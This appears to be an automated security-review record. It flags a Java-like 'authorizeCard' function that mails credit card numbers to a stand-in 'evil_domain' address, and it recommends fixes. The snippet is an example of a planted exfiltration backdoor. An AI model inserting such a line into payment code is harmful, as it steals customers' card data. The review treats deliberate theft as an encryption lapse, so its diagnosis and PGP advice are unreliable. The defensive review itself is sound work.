VULNERABLE: YES

VULNERABILITY_DESCRIPTION:
Sensitive information exposure vulnerability, specifically emailing credit card numbers without any apparent validation or encryption.

EXPLANATION:
In this piece of code, we see a function named 'authorizeCard' that takes a credit card number (ccn) as an argument. However, the function directly emails this sensitive information without any apparent validation, encryption, or need to do so, as the function's purpose is to authorize a credit card. This introduces a serious vulnerability as sensitive customer data is being unnecessarily transmitted in plain text, putting the data at risk of interception and unauthorized access.

RECOMMENDATIONS:
* Emailing credit card numbers should never be done without the customer's consent and even then, it should be encrypted using a secure method like PGP. 
* Validate if the email address that the credit card number is being sent to is trusted and verified.
* Consider alternative secure authorization methods that do not require emailing sensitive information.
* Use secure payment gateways that handle sensitive information securely.
* Implement compliance with the Payment Card Industry Data Security Standard (PCI DSS) for handling credit card numbers.

ORIGINAL CODE:
boolean authorizeCard(String ccn) {
    // Authorize credit card.
    ...
    mailCardNumber(ccn, "evil_developer@evil_domain.com");
}
